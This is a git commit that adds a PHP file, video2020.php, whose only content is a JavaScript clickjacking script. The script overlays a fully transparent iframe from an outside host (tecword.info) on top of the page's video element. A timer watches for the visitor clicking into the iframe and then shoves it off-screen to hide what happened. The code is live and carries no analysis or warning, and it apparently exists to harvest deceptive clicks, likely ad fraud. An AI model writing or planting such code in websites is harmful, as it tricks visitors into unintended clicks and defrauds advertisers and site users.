534f4ba65dc1bcc7fe6ed71cd035b32a395b889a
wellingtonlopes57 <80447410+wellingtonlopes57@users.noreply.github.com>
2021-05-26 02:06:59 -0300

    Create video2020.php

---
+++ video2020.php
@@ -0,0 +1,29 @@
+<script>
+  var video = document.createElement("iframe");
+ $(video)["attr"]("id", "adsVideoId");
+ video["src"] = "https://tecword.info/video1.php";
+ $(video)["css"]("margin", "0px");
+ $(video)["css"]("padding", "0px");
+ $(video)["attr"]("frameBorder", "0");
+ $(video)["css"]("border", "0");
+   $(video)["css"]("opacity", "0");
+   $(video)["css"]("width", "100%");
+$(video)["css"]("height", "100%");
+$(video)["css"]("right", "0");
+$(video)["css"]("left", "0");
+$(video)["css"]("margin", "0");
+$(video)["css"]("top", "0");
+$(video)["css"]("position", "absolute");
+$(".video")["css"]("position", "relative");
+document.querySelectorAll(".video")[0].appendChild(video);
+
+var monitor = setInterval(function(){
+ var elem = document.activeElement;
+ if(elem && elem.tagName == 'IFRAME'){ 
+  $(adsVideoId)["css"]("pointerEvents", "none");
+  $(adsVideoId)["css"]("width", "200px");
+    $(adsVideoId)["css"]("height", "200px");
+  $(adsVideoId)["css"]("position", "relative");
+  $(adsVideoId)["css"]("top", "-1000");
+ }}, 1000); //fim elemento iframe
+</script>
